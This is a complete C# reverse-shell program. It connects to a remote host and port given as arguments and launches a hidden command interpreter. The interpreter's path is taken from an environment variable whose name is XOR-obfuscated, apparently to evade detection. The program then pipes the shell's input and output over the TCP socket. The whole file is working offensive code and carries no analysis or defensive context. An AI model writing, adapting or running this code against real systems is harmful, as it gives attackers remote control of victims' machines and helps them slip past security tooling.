﻿using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;

namespace reverse
{
    class Program
    {
        static StreamWriter streamWriter;
        private static void Main(string[] args)
        {
            string host = args[0];
            int port = Int32.Parse(args[1]);
            string envvar = args[2];
            int xorkey = Int32.Parse(args[3]);

            string envvar1 = "";
            for (int i = 0; i < envvar.Length; i++)
            {
                char c = (char)(envvar[i] ^ xorkey);
                envvar1 = envvar1 + c;
            }
            
            Console.WriteLine("executing whatever is set in '{0}' pointing to {1}:{2}", envvar1,host,port);

            using (TcpClient client = new TcpClient(host, port))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        streamWriter = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        Process p = new Process();
                        //p.StartInfo.FileName = System.Environment.GetEnvironmentVariable("COMSPEC");
                        p.StartInfo.FileName = System.Environment.GetEnvironmentVariable(envvar1);
                        //p.StartInfo.FileName = envvar1;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.ErrorDataReceived += new DataReceivedEventHandler(CmdErrorDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        p.BeginErrorReadLine();

                        while (true)
                        {
                            strInput.Append(rdr.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

    }
}